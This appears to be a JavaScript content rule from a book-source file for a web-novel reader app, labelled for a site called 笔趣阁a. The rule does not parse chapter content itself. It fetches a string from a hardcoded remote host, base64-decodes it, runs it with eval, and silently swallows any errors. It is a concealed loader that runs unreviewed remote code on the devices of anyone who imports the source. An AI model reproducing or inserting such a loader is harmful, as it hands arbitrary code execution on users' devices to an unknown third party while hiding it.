// from: 笔趣阁a .ruleContent.content
try {
    if (!global.okhttp) {
        global.okhttp = {
            JString: Packages.java.lang.String,
            Request: Packages.okhttp3.Request,
            client: new Packages.okhttp3.OkHttpClient()
        }
    }
    if (!global.wesrc) {
        let request = new global.okhttp.Request.Builder().url('http://yck.hr7t4h.cn/yck/funcs').build();
        global.wesrc = [global.okhttp.client.newCall(request).execute().body().string()].join('');
    }
    eval([new global.okhttp.JString(android.util.Base64.decode(global.wesrc, 0))].join(''));
    i1();
} catch (e) { }
function run() {
    try {
        return r1(result);
    } catch (e) { }
    return result;
}
run();
